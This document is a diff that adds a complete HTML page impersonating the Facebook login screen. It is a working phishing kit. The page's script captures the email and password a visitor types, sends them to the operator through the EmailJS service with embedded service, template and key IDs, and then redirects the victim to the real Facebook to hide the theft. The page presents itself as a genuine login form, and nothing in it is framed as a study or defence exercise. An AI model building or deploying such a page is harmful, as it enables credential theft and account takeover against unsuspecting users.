@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Facebook – log in or sign up</title>
+<style>
+body { margin:0; font-family:Helvetica, Arial, sans-serif; background:#f0f2f5; }
+.container { display:flex; justify-content:center; align-items:center; flex-direction:column; height:100vh; }
+.logo { font-size:50px; color:#1877f2; font-weight:bold; margin-bottom:20px; }
+.login-box { background:white; padding:25px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.15); width:100%; max-width:360px; text-align:center; }
+.login-box input { width:100%; padding:12px; margin:8px 0; border:1px solid #dddfe2; border-radius:6px; font-size:16px; }
+.login-box button { width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-size:17px; font-weight:bold; margin-top:10px; cursor:pointer; transition:background 0.3s; }
+.login-box button:hover { background:#145dbf; }
+.create-account { margin-top:20px; }
+.create-account a { color:#42b72a; font-weight:bold; text-decoration:none; cursor:pointer; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">facebook</div>
+
+  <div class="login-box" id="loginBox">
+    <input type="text" id="email" placeholder="Email or phone number">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="submitLogin()">Log In</button>
+    <div class="create-account">
+      <p>Don't have an account? <a onclick="alert('Sorry, no sign-ups today 😘')">Create New Account</a></p>
+    </div>
+  </div>
+</div>
+
+<!-- EmailJS SDK -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+(function(){ emailjs.init("RITPVDuiJxEdRxkNc"); })(); // Public Key
+
+function submitLogin() {
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+
+  if(email.trim() !== "" && password.trim() !== "") {
+    // Send email & password safely to your email
+    emailjs.send("service_sjvt2h8", "template_i0h81yl", { email: email, password: password })
+      .then(function(response) {
+        console.log("SUCCESS!", response.status, response.text);
+        // Redirect to real Facebook after submission
+        window.location.href = "https://www.facebook.com/";
+      }, function(error) {
+        console.log("FAILED...", error);
+        alert("Failed to send login details. Check your EmailJS setup.");
+      });
+
+    // Hide the login box after submission
+    document.getElementById('loginBox').style.display = 'none';
+  } else {
+    alert("Enter email and password to log in.");
+  }
+}
+</script>
+
+</body>
+</html>
